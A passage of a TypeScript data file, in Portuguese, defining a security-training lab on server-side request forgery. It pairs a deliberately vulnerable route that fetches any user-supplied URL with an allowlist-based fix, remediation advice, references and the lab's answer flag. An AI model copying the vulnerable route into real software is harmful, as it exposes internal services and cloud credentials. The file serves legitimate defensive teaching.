        'Roubo de credenciais de IAM via endpoint de metadados em nuvem (como no caso Capital One), varredura e acesso a serviços internos, bypass de firewall e, por vezes, RCE. Em 2026, o CVE-2026-47938 (Adobe Campaign Classic, CVSS 10.0) levou SSRF a execução de código, e o CVE-2026-58508 (Gitea) mostrou SSRF por DNS rebinding — por isso validar o IP final (não só o hostname) é obrigatório.',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `router.get('/fetch-url', async (req, res) => {
  // FALHA: busca qualquer URL do usuario (sem allowlist nem validacao de IP)
  const r = await fetch(req.query.url);
  res.send(await r.text());
});`,
      secureLanguage: 'typescript',
      secureCode: `const ALLOW = new Set(['status.cybershield.com']);
router.get('/fetch-url', async (req, res) => {
  const u = new URL(req.query.url);
  if (u.protocol !== 'https:' || !ALLOW.has(u.hostname))
    return res.status(400).json({ error: 'destino nao permitido' });
  // resolver DNS e bloquear IPs privados/link-local (169.254/10/172.16/192.168/127)
  res.send(await (await fetch(u, { redirect: 'error' })).text());
});`,
      remediation: [
        'Use allowlist de domínios/esquemas; rejeite IPs privados, loopback e link-local (169.254.0.0/16).',
        'Resolva o DNS e valide o IP final (cuidado com rebinding e redirects → redirect: error).',
        'Bloqueie o acesso ao endpoint de metadados (IMDSv2 com hop-limit, em AWS).',
        'Isole a saída de rede do serviço (egress filtering) e use um proxy controlado.',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A10:2021 SSRF', url: 'https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/' },
      { label: 'OWASP SSRF Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html' },
      { label: 'CWE-918: Server-Side Request Forgery', url: 'https://cwe.mitre.org/data/definitions/918.html' },
      { label: 'Caso real (2026): CVE-2026-47938 — SSRF no Adobe Campaign Classic levando a execução de código (CVSS 10.0)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-47938' },
      { label: 'Caso real (2026): CVE-2026-58508 — SSRF via DNS rebinding no Gitea (CVSS 9.1)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-58508' },
      { label: 'Caso real (2024, explorado em massa): CVE-2024-21893 — SSRF no Ivanti Connect Secure, encadeado para RCE (CVSS 8.2)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21893' },
      { label: 'AWS IMDSv2 — mitigação de SSRF a metadados (contexto do caso Capital One)', url: 'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html' },
    ],
    flag: 'CYBER{a10_ssrf_reached_the_cloud_metadata}',
  },
];

/** Metadados publicos (sem flag) enviados ao frontend. */
export function publicLabs() {
  return LABS.map(({ flag, ...rest }) => rest);
}

export function findLab(id: string): LabDefinition | undefined {
  return LABS.find((l) => l.id === id);
}
